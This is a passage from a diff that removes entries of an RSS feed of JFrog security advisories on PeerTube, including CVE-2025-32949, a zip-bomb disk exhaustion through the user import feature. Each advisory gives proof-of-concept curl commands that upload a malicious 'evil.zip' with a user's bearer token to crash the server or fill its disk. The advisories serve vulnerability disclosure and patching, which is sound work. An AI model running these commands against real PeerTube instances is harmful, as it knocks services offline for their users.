-new_location=http:$(curl -s -D - 'http://127.0.0.1:3000/api/v1/users/1/imports/import-resumable' -H 'Authorization: Bearer user_token' -H 'Content-Type: application/json; charset=UTF-8' -H 'X-Upload-Content-Length: 168' -H 'X-Upload-Content-Type: application/x-zip-compressed' --data-raw '{"name":"evil.zip","mimeType":"application/x-zip-compressed","size":168,"lastModified":1743493990068,"filename":"evil.zip"}' | awk '/^location:/{print $2}' | tr -d '\r')
-curl -X PUT "$new_location" -H "Content-Type: application/octet-stream" -H "Content-Range: bytes 0-167/168" -H 'Authorization: user_token' --data-binary @evil.zip
-```
-If everything was done correctly, the PeerTube server will crash, and will keep crashing as long as the ZIP file is not deleted from the system.
-
-
-
-## Vulnerability Mitigations
-
-No mitigations are supplied for this issue
-
-
-
-## References
-
-[Fix release](https://github.com/Chocobozzz/PeerTube/releases/tag/v7.1.1)
-
-[PoC Materials](https://drive.google.com/file/d/1zmXFNutT4ACOJZGmxhU22nhu9Fbn4ui2/view?usp=drive_link)
-]]></content:encoded>
-        </item>
-        <item>
-            <title><![CDATA[PeerTube User Import Authenticated Resource Exhaustion]]></title>
-            <link>https://research.jfrog.com/vulnerabilities/peertube-archive-resource-exhaustion/</link>
-            <guid>https://research.jfrog.com/vulnerabilities/peertube-archive-resource-exhaustion/</guid>
-            <pubDate>Mon, 14 Apr 2025 00:00:00 GMT</pubDate>
-            <description><![CDATA[CVE-2025-32949 Medium severity. PeerTube User Import Authenticated Resource Exhaustion]]></description>
-            <content:encoded><![CDATA[## Summary
-This vulnerability allows any authenticated user to cause the server to consume very large amounts of disk space when extracting a Zip Bomb
-
-
-
-## Component
-
-[PeerTube](https://github.com/Chocobozzz/PeerTube)
-
-
-
-## Affected versions
-
-(, 7.1.0]
-
-
-
-## Description
-
-If user import is enabled (which is the default setting), any registered user can upload an archive for importing. The code uses the yauzl library for reading the archive.
-The yauzl library does not contain any mechanism to detect or prevent extraction of a [Zip Bomb](https://en.wikipedia.org/wiki/Zip_bomb). Therefore, when using the User Import functionality with a Zip Bomb, PeerTube will try extracting the archive which will cause a disk space resource exhaustion.
-
-## PoC
-
-This PoC assumes that there is a PeerTube instance on the machine listening on ports 3000 (client) and 9000 (server). Note that running this PoC will cause PeerTube’s server to shut down.
-
-
-
-1. First, using a browser, log in to the PeerTube instance with any user’s credentials, and use the inspection screen to copy the authorization token of the user.
-1. Create a Zip Bomb named `evil.zip` in the current directory
-1. In a terminal, run the following commands (replace “user_token” with the token obtained from step #1):
-```
-new_location=http:$(curl -s -D - 'http://127.0.0.1:3000/api/v1/users/1/imports/import-resumable' -H 'Authorization: Bearer user_token' -H 'Content-Type: application/json; charset=UTF-8' -H 'X-Upload-Content-Length: 168' -H 'X-Upload-Content-Type: application/x-zip-compressed' --data-raw '{"name":"evil.zip","mimeType":"application/x-zip-compressed","size":168,"lastModified":1743493990068,"filename":"evil.zip"}' | awk '/^location:/{print $2}' | tr -d '\r')
-curl -X PUT "$new_location" -H "Content-Type: application/octet-stream" -H "Content-Range: bytes 0-167/168" -H 'Authorization: user_token' --data-binary @evil.zip
-```
-If everything was done correctly, the PeerTube server will begin extracting the zip file, which will cause disk space resource exhaustion.
 
 
 
